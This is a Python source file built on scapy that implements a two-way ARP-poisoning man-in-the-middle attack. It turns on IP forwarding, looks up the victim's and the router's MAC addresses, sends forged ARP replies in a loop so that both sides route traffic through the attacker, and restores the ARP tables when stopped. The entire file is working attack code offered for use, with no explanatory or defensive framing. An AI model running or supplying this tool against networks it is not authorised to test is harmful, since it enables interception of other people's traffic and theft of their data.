from scapy.all import *
import sys
import os
import time

class Mitm():

        def __init__(self, interface, victim_ip, router_ip):

                self.interface = interface
                self.victim_ip = victim_ip
                self.router_ip = router_ip

        def start_attack(self):
                print("\nStarting two way MITM attack\n")
                print("\nEnabling IP Forwarding...\n")
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                self.mitm()

        def get_mac_address(self, ip):
                conf.verb = 0
                ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = self.interface, inter = 0.1)
                for snd,rcv in ans:
                        return rcv.sprintf(r"%Ether.src%")

        def trick(self, gm, vm):
                send(ARP(op = 2, pdst = self.victim_ip, psrc = self.router_ip, hwdst= vm))
                send(ARP(op = 2, pdst = self.router_ip, psrc = self.victim_ip, hwdst= gm))

        def mitm(self):
                try:
                        victimMAC = self.get_mac_address(self.victim_ip)
                except Exception:
                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                        print("Couldn't Find Victim MAC Address")
                        print("Stopping...")
                        return
                try:
                        gateMAC = self.get_mac_address(self.router_ip)
                except Exception:
                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                        print("Couldn't Find Gateway MAC Address")
                        print("Stopping...")
                        return

                print("Poisoning Targets...")
                while 1:
                        try:
                                self.trick(gateMAC, victimMAC)
                                time.sleep(1.5)
                        except KeyboardInterrupt:
                                self.re_arp()
                                break

        def stop_attack(self):
                self.re_arp()

        def re_arp(self):
                print("\nRestoring Targets...")
                victimMAC = self.get_mac_address(self.victim_ip)
                gateMAC = self.get_mac_address(self.router_ip)
                send(ARP(op = 2, pdst = self.router_ip, psrc = self.victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
                send(ARP(op = 2, pdst = self.victim_ip, psrc = self.router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
                print("Disabling IP Forwarding...")
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print("Shutting Down...")
